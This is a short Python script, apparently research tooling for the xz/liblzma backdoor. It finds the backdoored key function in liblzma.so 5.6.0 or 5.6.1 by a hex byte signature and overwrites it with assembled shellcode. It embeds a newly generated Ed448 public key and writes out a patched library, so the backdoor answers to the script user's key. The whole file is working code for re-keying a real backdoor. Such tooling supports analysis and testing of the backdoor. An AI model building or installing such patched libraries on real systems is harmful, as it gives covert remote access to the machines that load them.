#!/usr/bin/env python3
from ecpy.curves import Curve
from ecpy.keys import ECPrivateKey
from ecpy.eddsa import EDDSA
from pwn import *

import argparse
import binascii
import hashlib
import pathlib
import secrets
import sys

# generate_key bytes from backdoored v5.6.0
FUNC = unhex(
    "f30f1efa4885ff0f848e000000415455"
    "534889f34881eca00000004885f67504"
    "31c0eb6b4c8b4e084d85c974f34889e2"
    "31c0488d6c24304989fcb90c00000048"
    "89d74989e8be30000000f3abb91c0000"
    "004889eff3ab488d4c24204889d7"
)
FLEN = 160


def generate_random_seed() -> int:
    return secrets.randbits(57 * 8)


def patch_so(path: str, pub_key: bytes) -> None:
    context.update(arch="amd64", os="linux")

    # replace generate_key with a static key from mem
    p = asm(
        """
        push rsi
        push rdi
        push rcx
        lea rsi, [rip+32]
        mov rcx, 7
    cloop:
        mov rax, [rsi]
        mov [rdi], rax
        add rsi, 8
        add rdi, 8
        loop cloop
        mov eax, 1
        pop rcx
        pop rdi
        pop rsi
        ret
        """
    )
    print("ASM: ", p.hex(" "))
    p += pub_key
    p += b"\x00" * (FLEN - len(p))

    with open(path, "rb") as f:
        lzma = f.read()
    if FUNC not in lzma:
        print("Could not identify func")
        sys.exit(1)

    off = lzma.index(FUNC)
    print("Patching func at offset: " + hex(off))

    pathlib.Path(path + ".patch").unlink(missing_ok=True)
    with open(path + ".patch", "wb") as f:
        f.write(lzma[:off] + p + lzma[off + FLEN :])


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("path", help="path to liblzma.so.5.6.{0,1} file")
    parser.add_argument(
        "-s",
        "--seed",
        type=int,
        default=generate_random_seed(),
        help="Custom ed448 key seed to use for the public key, " "default is random",
    )
    args = parser.parse_args()

    curve = Curve.get_curve("Ed448")
    signer = EDDSA(hashlib.shake_256, hash_len=114)
    priv_key = ECPrivateKey(args.seed, curve)
    pub_key = signer.get_public_key(priv_key, hashlib.shake_256, hash_len=114)
    c_pub_key = curve.encode_point(pub_key.W)

    patch_so(args.path, c_pub_key)
    print(f"Generated patched .so: {args.path}.patch")
    print(f"Public key: {binascii.hexlify(c_pub_key).decode()}")
    print(f"Seed: {args.seed}")
